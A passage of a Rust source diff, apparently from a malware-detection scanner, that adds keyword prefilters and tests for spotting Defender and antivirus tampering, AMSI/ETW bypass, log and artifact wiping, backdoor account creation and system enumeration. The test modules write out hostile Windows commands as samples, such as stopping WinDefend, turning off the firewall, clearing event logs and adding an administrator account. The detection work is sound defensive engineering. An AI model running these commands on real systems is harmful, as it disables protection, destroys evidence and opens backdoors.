+                    "lowriskfiletypes" => [".exe", ".bat", ".cmd", ".reg", ".msi"]
+                        .iter()
+                        .any(|ext| data.contains(ext)),
+                    "hidezoneinfoonproperties" => data == "1" || data == "0x1",
+                    "savezoneinformation" => data == "2" || data == "0x2",
+                    _ => false,
+                };
+                if weakens {
+                    push("attachment-policy-weaken", value_name.to_string());
+                }
+            }
+            for caps in FIREWALL_OFF_RE.captures_iter(deobfuscated) {
+                let prof = caps
+                    .get(1)
+                    .map(|m| m.as_str().to_string())
+                    .unwrap_or_default();
+                push("netsh-fw-off", prof);
+            }
+        });
+    }
+
+    if has_defender_product_registry_atom_lower(&lower) {
+        profile_defender_group!("product_registry", {
+            for caps in SECURITY_PRODUCT_REMOVE_RE.captures_iter(deobfuscated) {
+                let target = caps
+                    .get(1)
+                    .map(|m| m.as_str().trim().chars().take(160).collect::<String>())
+                    .unwrap_or_default();
+                if is_encoded_security_product_remove_noise(&target) {
+                    continue;
+                }
+                push("security-product-remove", target);
+            }
+            for caps in SECURITY_SERVICE_DELETE_RE.captures_iter(deobfuscated) {
+                let service = caps
+                    .get(1)
+                    .map(|m| m.as_str().trim_matches('"').to_string())
+                    .unwrap_or_default();
+                push("security-service-delete", service);
+            }
+            for caps in SECURITY_STARTUP_DELETE_RE.captures_iter(deobfuscated) {
+                let value = caps
+                    .get(1)
+                    .map(|m| m.as_str().trim_matches('"').to_string())
+                    .unwrap_or_default();
+                push("security-startup-delete", value);
+            }
+        });
+    }
+
+    if has_defender_amsi_etw_atom_lower(&lower) {
+        profile_defender_group!("amsi_etw", {
+            if let Some(m) = AMSI_BYPASS_RE.find(deobfuscated) {
+                push("amsi-bypass", m.as_str().to_string());
+            }
+            if ETW_PATCH_RE.is_match(deobfuscated) {
+                push("etw-patch", String::new());
+            }
+        });
+    }
+}
+
+fn is_encoded_security_product_remove_noise(target: &str) -> bool {
+    let target = target.trim().trim_matches('"').trim_matches('\'');
+    if target.len() < 80 || target.chars().any(char::is_whitespace) || target.contains(['\\', ':'])
     {
-        let kind = format!(
-            "exclusion-{}",
-            caps.get(1)
-                .map(|m| m.as_str().to_ascii_lowercase())
-                .unwrap_or_default()
-        );
-        let target = caps
-            .get(2)
-            .map(|m| m.as_str().to_string())
-            .unwrap_or_default();
-        push(&kind, target);
+        return false;
     }
-    for caps in DISABLE_RE.captures_iter(deobfuscated) {
-        let opt = caps
-            .get(1)
-            .map(|m| m.as_str().to_ascii_lowercase())
-            .unwrap_or_default();
-        let val = caps
-            .get(2)
-            .map(|m| m.as_str().to_string())
-            .unwrap_or_default();
-        // Only flag the disabling forms — `$true` / `1` / `Disabled` /
-        // `2` (SubmitSamplesConsent=2 = never submit). Skip enabling
-        // values like `$false` to avoid false positives in remediation
-        // scripts that turn protections back on.
-        let val_lc = val.to_ascii_lowercase();
-        let disabling = matches!(
-            (opt.as_str(), val_lc.as_str()),
-            ("disablerealtimemonitoring", "$true" | "1" | "true")
-                | ("disablebehaviormonitoring", "$true" | "1" | "true")
-                | ("disableioavprotection", "$true" | "1" | "true")
-                | ("disableblockatfirstseen", "$true" | "1" | "true")
-                | ("disableprivacymode", "$true" | "1" | "true")
-                | ("disablescriptscanning", "$true" | "1" | "true")
-                | ("mapsreporting", "disabled" | "0")
-        ) || (opt == "submitsamplesconsent"
-            && (val_lc == "2" || val_lc == "never"));
-        if disabling {
-            push(&format!("setmp-{opt}"), val);
-        }
-    }
-    for caps in SC_DEFENDER_RE.captures_iter(deobfuscated) {
-        let verb = caps
-            .get(1)
-            .map(|m| m.as_str().to_ascii_lowercase())
-            .unwrap_or_default();
-        let svc = caps
-            .get(2)
-            .map(|m| m.as_str().to_string())
-            .unwrap_or_default();
-        push(&format!("sc-{verb}"), svc);
-    }
-    for caps in TASKKILL_SECURITY_RE.captures_iter(deobfuscated) {
-        let process = caps
-            .get(1)
-            .map(|m| format!("{}.exe", m.as_str()))
-            .unwrap_or_default();
-        push("taskkill-security-process", process);
-    }
-    for caps in SECURITY_BINARY_TAKEOWN_RE.captures_iter(deobfuscated) {
-        let binary = caps
-            .get(1)
-            .map(|m| format!("{}.exe", m.as_str()))
-            .unwrap_or_default();
-        push("security-binary-takeown", binary);
-    }
-    for caps in SECURITY_BINARY_ICACLS_RE.captures_iter(deobfuscated) {
-        let binary = caps
-            .get(1)
-            .map(|m| format!("{}.exe", m.as_str()))
-            .unwrap_or_default();
-        push("security-binary-acl-grant", binary);
-    }
-    for caps in SECURITY_BINARY_RENAME_RE.captures_iter(deobfuscated) {
-        let binary = caps
-            .get(1)
-            .map(|m| format!("{}.exe", m.as_str()))
-            .unwrap_or_default();
-        push("security-binary-rename", binary);
-    }
-    for line in deobfuscated.lines() {
-        let lower = line.to_ascii_lowercase();
-        if !lower.contains("schtasks")
-            || !lower.contains("/change")
-            || !lower.contains("/disable")
-            || (!lower.contains("windows defender") && !lower.contains("exploitguard"))
-        {
-            continue;
-        }
-        let task_name = SCHTASKS_TN_RE
-            .captures(line)
-            .and_then(|caps| caps.get(1).or_else(|| caps.get(2)))
-            .map(|m| m.as_str().to_string())
-            .unwrap_or_else(|| line.trim().chars().take(160).collect());
-        push("scheduled-task-disable", task_name);
-    }
-    for caps in DEFENDER_SERVICE_START_DISABLED_RE.captures_iter(deobfuscated) {
-        let service = caps
-            .get(1)
-            .map(|m| m.as_str().to_string())
-            .unwrap_or_default();
-        push("service-start-disabled", service);
-    }
-    for caps in ATTACHMENT_POLICY_WEAKEN_RE.captures_iter(deobfuscated) {
-        let value_name = caps.get(1).map(|m| m.as_str()).unwrap_or_default();
-        let data = caps
-            .get(2)
-            .map(|m| m.as_str().trim_matches('"').to_ascii_lowercase())
-            .unwrap_or_default();
-        let weakens = match value_name.to_ascii_lowercase().as_str() {
-            "lowriskfiletypes" => [".exe", ".bat", ".cmd", ".reg", ".msi"]
+
+    let encodedish = target
+        .bytes()
+        .filter(|b| b.is_ascii_alphanumeric() || matches!(b, b'/' | b'+' | b'=' | b'@' | b'#'))
+        .count();
+    encodedish.saturating_mul(100) >= target.len() * 90
+}
+
+#[cfg(test)]
+fn has_defender_evasion_atom(text: &str) -> bool {
+    let lower = text.to_ascii_lowercase();
+    has_defender_evasion_atom_lower(&lower)
+}
+
+fn has_defender_evasion_atom_lower(lower: &str) -> bool {
+    const DIRECT_ATOMS: &[&str] = &[
+        "add-mppreference",
+        "set-mppreference",
+        "windefend",
+        "msmpsvc",
+        "mpssvc",
+        "wuauserv",
+        "wdnissvc",
+        "wdboot",
+        "wdfilter",
+        "wdnisdrv",
+        "securityhealth",
+        "msmpeng",
+        "nissrv",
+        "mpcmdrun",
+        "windows defender",
+        "windowsdefender",
+        "microsoft defender",
+        "exploitguard",
+        "wintrust\\trust providers\\software publishing",
+        "lowriskfiletypes",
+        "hidezoneinfoonproperties",
+        "savezoneinformation",
+        "advfirewall",
+        "invoke-nullamsi",
+        "amsiinitfailed",
+        "amsiutils",
+        "amsicontext",
+        "amsisession",
+        "amsiscanbuffer",
+        "amsi.dll",
+        "etweventwrite",
+        "system.diagnostics.eventing.eventprovider",
+    ];
+    const SECURITY_PRODUCT_ATOMS: &[&str] = &[
+        "trend micro",
+        "sophos",
+        "kaspersky",
+        "symantec",
+        "mcafee",
+        "avast",
+        "avg",
+        "eset",
+        "malwarebytes",
+        "crowdstrike",
+        "sentinelone",
+        "carbonblack",
+        "cylance",
+        "bitdefender",
+        "mbam",
+        "ekrn",
+        "avp",
+        "ksde",
+        "mcawfwk",
+        "msk80service",
+        "mcapexe",
+        "mcbootdelaystartsvc",
+        "mccspsvc",
+        "mfefire",
+        "mcmpfsvc",
+        "mcpltsvc",
+        "mcproxy",
+        "mcods",
+        "mfemms",
+        "mfevtp",
+        "mcnaiann",
+        "nortonsecurity",
+        "sbamsvc",
+        "zillya",
+        "qhactivedefense",
+        "antivir",
+        "avira",
+        "vsserv",
+        "productagentservice",
+        "updatesrv",
+        "cmdagent",
+        "cmdvirth",
+        "dragonupdater",
+        "pefservice",
+        "sentinelagent",
+        "csfalconservice",
+        "avastui",
+        "qhsafetray",
+        "sbamtray",
+        "sbregrebootcleaner",
+        "iseui",
+        "comodo internet security",
+        "clamwin",
+        "avgui",
+        "superantispyware",
+    ];
+    const OPERATION_ATOMS: &[&str] = &[
+        "taskkill", "takeown", "icacls", "rename", "ren ", "ren\t", "reg", "rmdir", "rd ", "rd\t",
+        "del ", "del\t", "del.",
+    ];
+    DIRECT_ATOMS.iter().any(|atom| lower.contains(atom))
+        || (SECURITY_PRODUCT_ATOMS
+            .iter()
+            .any(|atom| lower.contains(atom))
+            && OPERATION_ATOMS.iter().any(|atom| lower.contains(atom)))
+}
+
+fn has_defender_service_process_atom_lower(lower: &str) -> bool {
+    const COMMAND_ATOMS: &[&str] = &[
+        "sc ", "sc.exe", "taskkill", "takeown", "icacls", "rename", "ren ", "ren\t",
+    ];
+    COMMAND_ATOMS.iter().any(|atom| lower.contains(atom))
+}
+
+fn has_defender_scheduled_registry_firewall_atom_lower(lower: &str) -> bool {
+    lower.contains("schtasks")
+        || lower.contains("advfirewall")
+        || (lower.contains("reg")
+            && (lower.contains("\\services\\")
+                || lower.contains("\\policies\\attachments")
+                || lower.contains("\\policies\\associations")))
+        || lower.contains("lowriskfiletypes")
+        || lower.contains("hidezoneinfoonproperties")
+        || lower.contains("savezoneinformation")
+}
+
+fn has_defender_product_registry_atom_lower(lower: &str) -> bool {
+    const PRODUCT_REMOVE_COMMANDS: &[&str] = &["rmdir", "rd ", "rd\t", "del ", "del\t", "del."];
+    const SECURITY_PRODUCT_ATOMS: &[&str] = &[
+        "trend micro",
+        "windows defender",
+        "microsoft defender",
+        "sophos",
+        "kaspersky",
+        "symantec",
+        "mcafee",
+        "avast",
+        "avg",
+        "eset",
+        "malwarebytes",
+        "crowdstrike",
+        "sentinelone",
+        "carbonblack",
+        "cylance",
+        "bitdefender",
+    ];
+    const SECURITY_SERVICE_OR_STARTUP_ATOMS: &[&str] = &[
+        "mbam",
+        "ekrn",
+        "egui",
+        "avp",
+        "ksde",
+        "mcawfwk",
+        "msk80service",
+        "mcapexe",
+        "mcbootdelaystartsvc",
+        "mccspsvc",
+        "mfefire",
+        "mcmpfsvc",
+        "mcpltsvc",
+        "mcproxy",
+        "mcods",
+        "mfemms",
+        "mfevtp",
+        "mcnaiann",
+        "nortonsecurity",
+        "sbamsvc",
+        "zillya",
+        "qhactivedefense",
+        "antivir",
+        "avira",
+        "vsserv",
+        "productagentservice",
+        "updatesrv",
+        "cmdagent",
+        "cmdvirth",
+        "dragonupdater",
+        "pefservice",
+        "sentinelagent",
+        "csfalconservice",
+        "avastui",
+        "qhsafetray",
+        "sbamtray",
+        "sbregrebootcleaner",
+        "iseui",
+        "comodo internet security",
+        "clamwin",
+        "avgui",
+        "superantispyware",
+        "securityhealth",
+        "eset",
+        "mcafee",
+        "norton",
+        "symantec",
+    ];
+
+    (PRODUCT_REMOVE_COMMANDS
+        .iter()
+        .any(|atom| lower.contains(atom))
+        && SECURITY_PRODUCT_ATOMS
+            .iter()
+            .any(|atom| lower.contains(atom)))
+        || (lower.contains("reg")
+            && lower.contains("delete")
+            && SECURITY_SERVICE_OR_STARTUP_ATOMS
                 .iter()
-                .any(|ext| data.contains(ext)),
-            "hidezoneinfoonproperties" => data == "1" || data == "0x1",
-            "savezoneinformation" => data == "2" || data == "0x2",
-            _ => false,
-        };
-        if weakens {
-            push("attachment-policy-weaken", value_name.to_string());
+                .any(|atom| lower.contains(atom)))
+}
+
+fn has_defender_amsi_etw_atom_lower(lower: &str) -> bool {
+    const AMSI_ETW_ATOMS: &[&str] = &[
+        "invoke-nullamsi",
+        "amsiinitfailed",
+        "amsiutils",
+        "amsicontext",
+        "amsisession",
+        "amsiscanbuffer",
+        "amsi.dll",
+        "etweventwrite",
+        "system.diagnostics.eventing.eventprovider",
+    ];
+    AMSI_ETW_ATOMS.iter().any(|atom| lower.contains(atom))
+}
+
+#[cfg(test)]
+mod defender_evasion_prefilter_tests {
+    use super::{
+        has_defender_amsi_etw_atom_lower, has_defender_evasion_atom,
+        has_defender_product_registry_atom_lower,
+        has_defender_scheduled_registry_firewall_atom_lower,
+        has_defender_service_process_atom_lower,
+    };
+
+    #[test]
+    fn prefilter_allows_known_defender_evasion_shapes() {
+        for sample in [
+            r#"powershell Add-MpPreference -ExclusionPath C:\Users\Public"#,
+            "Set-MpPreference -DisableRealtimeMonitoring $true",
+            "sc stop WinDefend",
+            "taskkill /im SecurityHealthSystray.exe /f",
+            "taskkill /im WindowsDefender.exe /f",
+            r#"takeown /f C:\Windows\System32\MsMpEng.exe"#,
+            r#"schtasks /Change /TN "Microsoft\Windows\Windows Defender\Cache Maintenance" /Disable"#,
+            r#"reg add HKLM\System\CurrentControlSet\Services\WinDefend /v Start /d 4"#,
+            r#"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Attachments /v SaveZoneInformation /d 2"#,
+            "netsh advfirewall set allprofiles state off",
+            r#"rmdir /s /q "C:\Program Files (x86)\Trend Micro""#,
+            r#"reg delete HKLM\SYSTEM\CurrentControlSet\services\MBAMService /f"#,
+            r#"reg delete HKLM\SYSTEM\CurrentControlSet\services\AVP21.3 /f"#,
+            r#"reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "AVGUI.exe" /f"#,
+            r#"taskkill /im avgui.exe /f"#,
+            "Invoke-NullAMSI",
+            "EtwEventWrite",
+        ] {
+            assert!(has_defender_evasion_atom(sample), "blocked: {sample}");
         }
     }
-    for caps in FIREWALL_OFF_RE.captures_iter(deobfuscated) {
-        let prof = caps
-            .get(1)
-            .map(|m| m.as_str().to_string())
-            .unwrap_or_default();
-        push("netsh-fw-off", prof);
+
+    #[test]
+    fn prefilter_blocks_unrelated_text() {
+        assert!(!has_defender_evasion_atom("echo hello && whoami"));
+        assert!(!has_defender_evasion_atom(
+            r#"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v App /d app.exe"#,
+        ));
+        assert!(!has_defender_evasion_atom(
+            "echo avg payload size && echo avp staging note"
+        ));
     }
-    for caps in SECURITY_PRODUCT_REMOVE_RE.captures_iter(deobfuscated) {
-        let target = caps
-            .get(1)
-            .map(|m| m.as_str().trim().chars().take(160).collect())
-            .unwrap_or_default();
-        push("security-product-remove", target);
-    }
-    for caps in SECURITY_SERVICE_DELETE_RE.captures_iter(deobfuscated) {
-        let service = caps
-            .get(1)
-            .map(|m| m.as_str().trim_matches('"').to_string())
-            .unwrap_or_default();
-        push("security-service-delete", service);
-    }
-    for caps in SECURITY_STARTUP_DELETE_RE.captures_iter(deobfuscated) {
-        let value = caps
-            .get(1)
-            .map(|m| m.as_str().trim_matches('"').to_string())
-            .unwrap_or_default();
-        push("security-startup-delete", value);
-    }
-    if let Some(m) = AMSI_BYPASS_RE.find(deobfuscated) {
-        push("amsi-bypass", m.as_str().to_string());
-    }
-    if ETW_PATCH_RE.is_match(deobfuscated) {
-        push("etw-patch", String::new());
+
+    #[test]
+    fn internal_gates_allow_known_defender_evasion_shapes() {
+        assert!(has_defender_service_process_atom_lower(
+            &"sc stop WinDefend".to_ascii_lowercase()
+        ));
+        assert!(has_defender_service_process_atom_lower(
+            &"taskkill /im SecurityHealthSystray.exe /f".to_ascii_lowercase()
+        ));
+        assert!(has_defender_scheduled_registry_firewall_atom_lower(
+            &r#"reg add HKLM\System\CurrentControlSet\Services\WinDefend /v Start /d 4"#
+                .to_ascii_lowercase()
+        ));
+        assert!(has_defender_scheduled_registry_firewall_atom_lower(
+            &"netsh advfirewall set allprofiles state off".to_ascii_lowercase()
+        ));
+        assert!(has_defender_product_registry_atom_lower(
+            &r#"rmdir /s /q "C:\Program Files (x86)\Trend Micro""#.to_ascii_lowercase()
+        ));
+        assert!(has_defender_product_registry_atom_lower(
+            &r#"reg delete HKLM\SYSTEM\CurrentControlSet\services\MBAMService /f"#
+                .to_ascii_lowercase()
+        ));
+        assert!(has_defender_product_registry_atom_lower(
+            &r#"reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "AVGUI.exe" /f"#
+                .to_ascii_lowercase()
+        ));
+        assert!(has_defender_amsi_etw_atom_lower(
+            &"Invoke-NullAMSI".to_ascii_lowercase()
+        ));
     }
 }
 
@@ -2268,14 +6492,28 @@ fn scan_inmem_assembly_load(deobfuscated: &str, env: &mut Environment) {
         )
         .expect("reflect load regex")
     });
-    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
-    for caps in REFLECT_RE.captures_iter(deobfuscated) {
-        let variant = caps
-            .get(1)
-            .map(|m| m.as_str().to_string())
-            .unwrap_or_default();
+    static APPDOMAIN_LOAD_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(r#"(?i)\[(?:system\.)?AppDomain\]::CurrentDomain\.Load\s*\("#)
+            .expect("appdomain load regex")
+    });
+    static DYNAMIC_REFLECT_LOAD_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(
+            r#"(?is)\[(?:system\.)?Reflection\.Assembly\]::\s*\([^)]+\)\s*\(\s*\[byte\[\]\]"#,
+        )
+        .expect("dynamic reflect load regex")
+    });
+    static CUSTOM_LOADASSEMBLY_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(r#"(?is)\bLoadAssembly\s*\([^)]*\).*?\bGetTypes\s*\(.*?\bGetMethod\s*\(.*?\bInvoke\s*\("#)
+            .expect("custom loadassembly regex")
+    });
+
+    fn push_inmem_assembly_load(
+        env: &mut Environment,
+        seen: &mut std::collections::HashSet<String>,
+        variant: String,
+    ) {
         if variant.is_empty() || !seen.insert(variant.clone()) {
-            continue;
+            return;
         }
         if env.traits.iter().any(|t| {
             matches!(
@@ -2283,10 +6521,28 @@ fn scan_inmem_assembly_load(deobfuscated: &str, env: &mut Environment) {
                 crate::traits::Trait::InMemoryAssemblyLoad { variant: v } if v == &variant
             )
         }) {
-            continue;
+            return;
         }
         env.traits
             .push(crate::traits::Trait::InMemoryAssemblyLoad { variant });
+    }
+
+    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
+    for caps in REFLECT_RE.captures_iter(deobfuscated) {
+        let variant = caps
+            .get(1)
+            .map(|m| m.as_str().to_string())
+            .unwrap_or_default();
+        push_inmem_assembly_load(env, &mut seen, variant);
+    }
+    if APPDOMAIN_LOAD_RE.is_match(deobfuscated) {
+        push_inmem_assembly_load(env, &mut seen, "AppDomain.Load".to_string());
+    }
+    if DYNAMIC_REFLECT_LOAD_RE.is_match(deobfuscated) {
+        push_inmem_assembly_load(env, &mut seen, "DynamicLoad".to_string());
+    }
+    if CUSTOM_LOADASSEMBLY_RE.is_match(deobfuscated) {
+        push_inmem_assembly_load(env, &mut seen, "LoadAssembly".to_string());
     }
 }
 
@@ -2428,6 +6684,9 @@ fn scan_anti_recovery(deobfuscated: &str, env: &mut Environment) {
 fn scan_evidence_cleanup(deobfuscated: &str, env: &mut Environment) {
     use once_cell::sync::Lazy;
     use regex::Regex;
+    if !has_evidence_cleanup_atom(deobfuscated) {
+        return;
+    }
 
     static EVENT_LOG_RE: Lazy<Regex> = Lazy::new(|| {
         Regex::new(r#"(?im)^[^\r\n]*?\bwevtutil(?:\.exe)?\s+cl\s+("[^"\r\n]+"|[^\s\r\n]+)[^\r\n]*"#)
@@ -2546,8 +6805,66 @@ fn scan_evidence_cleanup(deobfuscated: &str, env: &mut Environment) {
     }
 }
 
+fn has_evidence_cleanup_atom(text: &str) -> bool {
+    let lower = text.to_ascii_lowercase();
+    [
+        "wevtutil",
+        "fsutil",
+        "prefetch",
+        "recent",
+        "automaticdestinations",
+        "customdestinations",
+        "userassist",
+        "recentdocs",
+        "muicache",
+        "bagmru",
+        "shell\\bags",
+        "comdlg32",
+        "runmru",
+        "typedpaths",
+    ]
+    .iter()
+    .any(|atom| lower.contains(atom))
+}
+
+#[cfg(test)]
+mod evidence_cleanup_prefilter_tests {
+    use super::has_evidence_cleanup_atom;
+
+    #[test]
+    fn prefilter_allows_known_cleanup_targets() {
+        for sample in [
+            "wevtutil cl Security",
+            "fsutil usn deletejournal /d c:",
+            r#"del /s /q C:\Windows\Prefetch\*.*"#,
+            r#"del /q "%APPDATA%\Microsoft\Windows\Recent\AutomaticDestinations\*.*""#,
+            r#"del /q "%APPDATA%\Microsoft\Windows\Recent\CustomDestinations\*.*""#,
+            r#"reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"#,
+            r#"reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs"#,
+            r#"reg delete HKCU\Software\Microsoft\Windows\ShellNoRoam\MUICache"#,
+            r#"reg delete HKCU\Software\Microsoft\Windows\Shell\BagMRU"#,
+            r#"reg delete HKCU\Software\Microsoft\Windows\Shell\Bags"#,
+            r#"reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU"#,
+            r#"reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"#,
+            r#"reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths"#,
+        ] {
+            assert!(has_evidence_cleanup_atom(sample), "blocked: {sample}");
+        }
+    }
+
+    #[test]
+    fn prefilter_blocks_generic_delete_text() {
+        assert!(!has_evidence_cleanup_atom(
+            r#"del /f /q C:\Temp\installer.log"#
+        ));
+        assert!(!has_evidence_cleanup_atom(
+            r#"reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v App /f"#,
+        ));
+    }
+}
+
 /// Network/IP discovery probes: nslookup, Resolve-DnsName, ping to
-/// non-loopback IPs, calls to ipify/checkip/ip-api.
+/// non-loopback IPs, calls to ipify/checkip/ip-api/geolocation APIs.
 fn scan_network_probe(deobfuscated: &str, env: &mut Environment) {
     use once_cell::sync::Lazy;
     use regex::Regex;
@@ -2560,37 +6877,9 @@ fn scan_network_probe(deobfuscated: &str, env: &mut Environment) {
         )
         .expect("resolve-dns re")
     });
-    static IP_DISCOVERY_HOSTS: &[&str] = &[
-        "api.ipify.org",
-        "ipv4.icanhazip.com",
-        "icanhazip.com",
-        "checkip.dyndns.org",
-        "checkip.amazonaws.com",
-        "ifconfig.me",
-        "ip-api.com",
-        "ipinfo.io",
-        "reallyfreegeoip.org",
-    ];
-    let mut push = |kind: &str, target: String| {
-        if target.is_empty() {
-            return;
-        }
-        if env.traits.iter().any(|t| {
-            matches!(
-                t, crate::traits::Trait::NetworkProbe { probe_kind: k, target: tg }
-                    if k == kind && tg == &target
-            )
-        }) {
-            return;
-        }
-        env.traits.push(crate::traits::Trait::NetworkProbe {
-            probe_kind: kind.to_string(),
-            target,
-        });
-    };
     for c in NSLOOKUP_RE.captures_iter(deobfuscated) {
         if let Some(m) = c.get(1) {
-            push("dns-lookup", m.as_str().to_string());
+            push_network_probe(env, "dns-lookup", m.as_str().to_string());
         }
     }
     for c in RESOLVE_DNS_RE.captures_iter(deobfuscated) {
@@ -2600,19 +6889,75 @@ fn scan_network_probe(deobfuscated: &str, env: &mut Environment) {
             .or_else(|| c.get(3))
             .map(|m| m.as_str().to_string())
             .unwrap_or_default();
-        push("dns-lookup", h);
+        push_network_probe(env, "dns-lookup", h);
     }
     let lower = deobfuscated.to_ascii_lowercase();
     for host in IP_DISCOVERY_HOSTS {
         if lower.contains(host) {
-            push("ip-discovery", (*host).to_string());
+            push_network_probe(env, "ip-discovery", (*host).to_string());
         }
     }
+}
+
+pub(crate) fn scan_network_probe_url(url: &str, env: &mut Environment) {
+    let Some(host) = url_host_lower(url) else {
+        return;
+    };
+    if IP_DISCOVERY_HOSTS.iter().any(|known| host == *known) {
+        push_network_probe(env, "ip-discovery", host);
+    }
+}
+
+fn url_host_lower(url: &str) -> Option<String> {
+    let (_, rest) = url.split_once(':')?;
+    let rest = rest.trim_start_matches(['/', '\\']);
+    if rest.is_empty() {
+        return None;
+    }
+    let authority = rest
+        .split(['/', '\\', '?', '#'])
+        .next()
+        .unwrap_or_default()
+        .rsplit('@')
+        .next()
+        .unwrap_or_default();
+    let host = authority
+        .strip_prefix('[')
+        .and_then(|s| s.split_once(']').map(|(host, _)| host))
+        .unwrap_or_else(|| authority.split(':').next().unwrap_or_default())
+        .trim_end_matches('.');
+    if host.is_empty() {
+        None
+    } else {
+        Some(host.to_ascii_lowercase())
+    }
+}
+
+fn push_network_probe(env: &mut Environment, kind: &str, target: String) {
+    if target.is_empty() {
+        return;
+    }
+    if env.traits.iter().any(|t| {
+        matches!(
+            t, crate::traits::Trait::NetworkProbe { probe_kind, target: tg }
+                if probe_kind == kind && tg == &target
+        )
+    }) {
+        return;
+    }
+    env.traits.push(crate::traits::Trait::NetworkProbe {
+        probe_kind: kind.to_string(),
+        target,
+    });
 }
 
 /// Local account backdoor setup: create a local user or add an account
 /// to a local group such as Administrators / Remote Desktop Users.
 fn scan_account_modification(deobfuscated: &str, env: &mut Environment) {
+    if !has_account_modification_atom(deobfuscated) {
+        return;
+    }
+
     use once_cell::sync::Lazy;
     use regex::Regex;
     static NET_USER_ADD_RE: Lazy<Regex> = Lazy::new(|| {
@@ -2688,10 +7033,43 @@ fn scan_account_modification(deobfuscated: &str, env: &mut Environment) {
     }
 }
 
+fn has_account_modification_atom(text: &str) -> bool {
+    let lower = text.to_ascii_lowercase();
+    lower.contains("/add")
+        && lower.contains("net")
+        && (lower.contains("user") || lower.contains("localgroup"))
+}
+
+#[cfg(test)]
+mod account_modification_prefilter_tests {
+    use super::has_account_modification_atom;
+
+    #[test]
+    fn prefilter_allows_net_user_and_localgroup_adds() {
+        for sample in [
+            r#"net user support P@ssw0rd /add"#,
+            r#"net1.exe user support P@ssw0rd /ADD"#,
+            r#"net localgroup Administrators support /add"#,
+        ] {
+            assert!(has_account_modification_atom(sample), "blocked: {sample}");
+        }
+    }
+
+    #[test]
+    fn prefilter_blocks_unrelated_net_usage() {
+        assert!(!has_account_modification_atom(r#"net user"#));
+        assert!(!has_account_modification_atom(r#"echo /add"#));
+    }
+}
+
 /// File/directory concealment via `attrib +h` / `attrib +s`. Common
 /// malware batches hide staged scripts and binaries after writing them
 /// into AppData, Templates, or Startup directories.
 fn scan_file_concealment(deobfuscated: &str, env: &mut Environment) {
+    if !has_file_concealment_atom(deobfuscated) {
+        return;
+    }
+
     fn clean_token(token: &str) -> String {
         token
             .trim()
@@ -2785,47 +7163,93 @@ fn scan_file_concealment(deobfuscated: &str, env: &mut Environment) {
     }
 }
 
+fn has_file_concealment_atom(text: &str) -> bool {
+    let lower = text.to_ascii_lowercase();
+    lower.contains("attrib") && (lower.contains("+h") || lower.contains("+s"))
+}
+
+#[cfg(test)]
+mod file_concealment_prefilter_tests {
+    use super::has_file_concealment_atom;
+
+    #[test]
+    fn prefilter_allows_hidden_and_system_attrib_commands() {
+        assert!(has_file_concealment_atom(r#"attrib +h payload.exe"#));
+        assert!(has_file_concealment_atom(r#"ATTRIB +S "%APPDATA%\a.bat""#));
+    }
+
+    #[test]
+    fn prefilter_blocks_attrib_without_concealment_flags() {
+        assert!(!has_file_concealment_atom(r#"attrib -h payload.exe"#));
+        assert!(!has_file_concealment_atom(r#"echo +h payload.exe"#));
+    }
+}
+
 /// System enumeration / account discovery. `net user`, `net group`,
 /// `net localgroup administrators`, `whoami /priv`, `Get-LocalUser`,
 /// `Get-NetUser` (PowerView).
 fn scan_enumeration(deobfuscated: &str, env: &mut Environment) {
+    if !has_enumeration_atom(deobfuscated) {
+        return;
+    }
+
     use once_cell::sync::Lazy;
     use regex::Regex;
-    static PATTERNS: Lazy<Vec<(Regex, &str)>> = Lazy::new(|| {
+    static PATTERNS: Lazy<Vec<(Regex, &str, bool)>> = Lazy::new(|| {
         vec![
             (
                 Regex::new(r"(?im)^[^\r\n]*?\bnet(?:\.exe)?\s+(?:user|group|localgroup)\b[^\r\n]*")
                     .unwrap(),
                 "net-user",
+                false,
             ),
             (
                 Regex::new(r"(?i)\bwhoami(?:\.exe)?\s+/(?:priv|groups|all)\b").unwrap(),
                 "whoami-priv",
+                false,
             ),
             (
                 Regex::new(r"(?i)\b(?:query\s+session|quser)\b").unwrap(),
                 "query-session",
+                false,
             ),
             (
                 Regex::new(r"(?i)\bGet-LocalUser\b").unwrap(),
                 "get-localuser",
+                false,
             ),
             (
                 Regex::new(r"(?i)\bGet-NetUser\b|\bGet-NetGroup\b").unwrap(),
                 "powerview-get",
+                false,
             ),
             (
                 Regex::new(r"(?i)\bsysteminfo(?:\.exe)?\b").unwrap(),
                 "systeminfo",
+                false,
             ),
             (
                 Regex::new(r"(?i)\b(?:tasklist|wmic\s+process)\b").unwrap(),
                 "tasklist",
+                false,
+            ),
+            (
+                Regex::new(
+                    r"(?im)\bwmic(?:\.exe)?\s+(?:cpu|computersystem|logicaldisk|partition|path\s+softwareLicensingService)\b[^\r\n]*?\bget\b[^\r\n]*",
+                )
+                .unwrap(),
+                "wmic-enum",
+                true,
             ),
         ]
     });
-    for (re, kind) in PATTERNS.iter() {
-        if let Some(m) = re.find(deobfuscated) {
+    for (re, kind, multi) in PATTERNS.iter() {
+        let matches: Box<dyn Iterator<Item = regex::Match<'_>> + '_> = if *multi {
+            Box::new(re.find_iter(deobfuscated))
+        } else {
+            Box::new(re.find(deobfuscated).into_iter())
+        };
+        for m in matches {
             let cmd = m
                 .as_str()
                 .chars()
@@ -2833,9 +7257,16 @@ fn scan_enumeration(deobfuscated: &str, env: &mut Environment) {
                 .collect::<String>()
                 .trim()
                 .to_string();
+            let cmd = if *kind == "wmic-enum" {
+                sanitize_wmic_enum_command(&cmd)
+            } else {
+                cmd
+            };
             if env.traits.iter().any(|t| {
                 matches!(
-                    t, crate::traits::Trait::Enumeration { enum_kind: k, command: _ } if k == kind
+                    t,
